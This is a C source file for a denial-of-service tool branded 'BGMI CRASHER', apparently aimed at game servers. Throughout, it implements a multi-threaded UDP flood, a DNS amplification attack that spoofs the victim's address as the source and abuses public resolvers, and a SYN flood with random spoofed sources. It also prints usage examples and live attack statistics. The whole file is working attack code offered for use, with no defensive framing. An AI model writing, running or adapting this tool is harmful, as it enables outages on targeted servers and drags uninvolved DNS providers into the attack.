#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <netdb.h>

// ============ CONFIG ============
#define MAX_THREADS 10000
#define SOCKET_BUFFER 33554432  // 32MB buffer
#define DNS_PORT 53

// DNS Servers for amplification
char *dns_servers[] = {
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
    "149.112.112.112", "208.67.222.222", "208.67.220.220",
    "156.154.70.1", "156.154.71.1", "64.6.64.6", "64.6.65.6",
    "77.88.8.8", "77.88.8.1", "185.228.168.9", "185.228.168.10"
};

// Amplification domains
char *amplified_domains[] = {
    "isc.org", "dnssec.works", "sigfail.verteiltesysteme.net",
    "sigok.verteiltesysteme.net", "dnssec.icann.org"
};

volatile int keep_running = 1;
volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;

char *target_ip;
int target_port;
int attack_duration;
int thread_count;

// Checksum functions
unsigned short ip_checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) { sum += *buffer++; size -= 2; }
    if (size) sum += *(unsigned char *)buffer;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// Build DNS query with EDNS0
int build_dns_query(char *buffer, const char *domain, unsigned short txid) {
    struct {
        unsigned short id;
        unsigned short flags;
        unsigned short qdcount;
        unsigned short ancount;
        unsigned short nscount;
        unsigned short arcount;
    } *dns = (void *)buffer;
    
    char *qname = buffer + 12;
    int pos = 0;
    
    dns->id = htons(txid);
    dns->flags = htons(0x0100);
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = htons(1);
    
    // Random subdomain
    char random_sub[32];
    snprintf(random_sub, sizeof(random_sub), "%08x.%08x.", rand(), rand());
    char full_domain[256];
    snprintf(full_domain, sizeof(full_domain), "%s%s", random_sub, domain);
    
    // Encode domain
    char *dot = full_domain;
    while (*dot) {
        char *next = strchr(dot, '.');
        int len = next ? next - dot : strlen(dot);
        qname[pos++] = len;
        memcpy(qname + pos, dot, len);
        pos += len;
        dot = next ? next + 1 : dot + strlen(dot);
    }
    qname[pos++] = 0;
    
    // Question
    unsigned short qtype = htons(255);
    unsigned short qclass = htons(1);
    memcpy(buffer + 12 + pos, &qtype, 2);
    memcpy(buffer + 12 + pos + 2, &qclass, 2);
    pos += 4;
    
    // EDNS0
    struct {
        unsigned short name;
        unsigned short type;
        unsigned short udp_size;
        unsigned short ext_rcode;
        unsigned short version;
        unsigned short flags;
        unsigned short data_len;
    } __attribute__((packed)) edns = {0, htons(41), htons(4096), 0, 0, 0, 0};
    
    memcpy(buffer + 12 + pos, &edns, sizeof(edns));
    pos += sizeof(edns);
    
    return 12 + pos;
}

// UDP Flood (High speed)
void *udp_flood(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int sndbuf = SOCKET_BUFFER;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &dest.sin_addr);
    
    char packet[65507];
    memset(packet, 0xFF, sizeof(packet));
    
    time_t end = time(NULL) + attack_duration;
    
    while (keep_running && time(NULL) < end) {
        sendto(sock, packet, 1400, 0, (struct sockaddr *)&dest, sizeof(dest));
        __sync_fetch_and_add(&total_packets, 1);
        __sync_fetch_and_add(&total_bytes, 1400);
    }
    close(sock);
    return NULL;
}

// DNS Amplification with Spoofing (GBPS)
void *dns_amp(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;
    
    int opt = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    int sndbuf = SOCKET_BUFFER;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(DNS_PORT);
    
    char packet[4096];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *dns_data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    time_t end = time(NULL) + attack_duration;
    int dns_idx = 0, domain_idx = 0;
    unsigned short txid = rand();
    
    while (keep_running && time(NULL) < end) {
        dns_idx = (dns_idx + 1) % (sizeof(dns_servers) / sizeof(dns_servers[0]));
        domain_idx = (domain_idx + 1) % (sizeof(amplified_domains) / sizeof(amplified_domains[0]));
        
        inet_pton(AF_INET, dns_servers[dns_idx], &dest.sin_addr);
        
        int dns_len = build_dns_query(dns_data, amplified_domains[domain_idx], txid++);
        
        udp->source = htons(rand() % 65535);
        udp->dest = htons(DNS_PORT);
        udp->len = htons(sizeof(struct udphdr) + dns_len);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len);
        ip->id = rand() % 65535;
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_UDP;
        ip->check = 0;
        
        // SPOOFED SOURCE = TARGET IP
        inet_pton(AF_INET, target_ip, &ip->saddr);
        ip->daddr = dest.sin_addr.s_addr;
        ip->check = ip_checksum((unsigned short *)ip, sizeof(struct iphdr));
        
        sendto(sock, packet, ntohs(ip->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest));
        __sync_fetch_and_add(&total_packets, 1);
        __sync_fetch_and_add(&total_bytes, ntohs(ip->tot_len));
        
        usleep(1);
    }
    close(sock);
    return NULL;
}

// SYN Flood
void *syn_flood(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &dest.sin_addr);
    
    char packet[4096];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    time_t end = time(NULL) + attack_duration;
    
    while (keep_running && time(NULL) < end) {
        memset(packet, 0, sizeof(packet));
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id = rand();
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = rand();
        ip->daddr = dest.sin_addr.s_addr;
        ip->check = ip_checksum((unsigned short *)ip, sizeof(struct iphdr));
        
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(target_port);
        tcp->seq = rand();
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        
        sendto(sock, packet, ntohs(ip->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest));
        __sync_fetch_and_add(&total_packets, 1);
        __sync_fetch_and_add(&total_bytes, ntohs(ip->tot_len));
    }
    close(sock);
    return NULL;
}

void signal_handler(int sig) {
    keep_running = 0;
}

void banner() {
    printf("\033[1;31m");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║     🔥 BGMI CRASHER - GBPS READY 🔥                      ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║  [✓] UDP Flood (High Speed)                             ║\n");
    printf("║  [✓] DNS Amplification (GBPS)                           ║\n");
    printf("║  [✓] SYN Flood (Root Only)                              ║\n");
    printf("║  [✓] Multi-threaded (Up to 10000 threads)               ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");
}

int main(int argc, char *argv[]) {
    banner();
    
    if (argc < 4) {
        printf("\033[1;33mUsage: %s <IP> <PORT> <TIME> [THREADS]\033[0m\n", argv[0]);
        printf("\n");
        printf("Examples:\n");
        printf("  ./bgmi 192.168.1.1 80 60 2000\n");
        printf("  sudo ./bgmi 1.2.3.4 443 120 5000\n");
        printf("\n");
        return 1;
    }
    
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);
    thread_count = (argc > 4) ? atoi(argv[4]) : 2000;
    
    if (thread_count > MAX_THREADS) thread_count = MAX_THREADS;
    
    signal(SIGINT, signal_handler);
    srand(time(NULL) ^ getpid());
    
    printf("\033[1;32m");
    printf("════════════════════════════════════════════\n");
    printf("  TARGET: %s:%d\n", target_ip, target_port);
    printf("  DURATION: %d seconds\n", attack_duration);
    printf("  THREADS: %d\n", thread_count);
    printf("════════════════════════════════════════════\n");
    printf("\033[0m\n");
    
    pthread_t threads[thread_count];
    
    // Launch UDP flood threads
    printf("[✓] Launching UDP Flood...\n");
    for (int i = 0; i < thread_count / 2; i++) {
        pthread_create(&threads[i], NULL, udp_flood, NULL);
    }
    
    // Launch DNS amplification threads (GBPS)
    printf("[✓] Launching DNS Amplification (GBPS mode)...\n");
    for (int i = thread_count / 2; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, dns_amp, NULL);
    }
    
    // If root, also launch SYN flood
    if (geteuid() == 0) {
        printf("[✓] Root detected - Launching SYN Flood (Extra damage)...\n");
        pthread_t syn_threads[1000];
        for (int i = 0; i < 1000; i++) {
            pthread_create(&syn_threads[i], NULL, syn_flood, NULL);
        }
    }
    
    printf("\n\033[1;31m[💀] ATTACK IN PROGRESS! Press Ctrl+C to stop\033[0m\n\n");
    
    // Progress monitor
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    time_t last_time = time(NULL);
    
    while (keep_running) {
        sleep(1);
        time_t now = time(NULL);
        int elapsed = now - last_time;
        
        if (elapsed >= 1) {
            unsigned long long pps = (total_packets - last_packets) / elapsed;
            unsigned long long bps = (total_bytes - last_bytes) * 8 / elapsed;
            double gbps = bps / 1000000000.0;
            int remaining = attack_duration - (now - time(NULL) + attack_duration);
            if (remaining < 0) remaining = 0;
            
            printf("\r\033[K[🔥] PPS: %'llu | GBPS: %.2f | Total: %.2f GB | Time left: %ds", 
                   pps, gbps, (double)total_bytes / 1073741824, remaining);
            fflush(stdout);
            
            last_packets = total_packets;
            last_bytes = total_bytes;
            last_time = now;
        }
        
        if (time(NULL) >= last_time + attack_duration) {
            keep_running = 0;
        }
    }
    
    printf("\n\n\033[1;32m════════════════════════════════════════════\n");
    printf("  ATTACK COMPLETE!\n");
    printf("  Total Packets: %'llu\n", total_packets);
    printf("  Total Data: %.2f GB\n", (double)total_bytes / 1073741824);
    printf("════════════════════════════════════════════\033[0m\n");
    
    return 0;
}
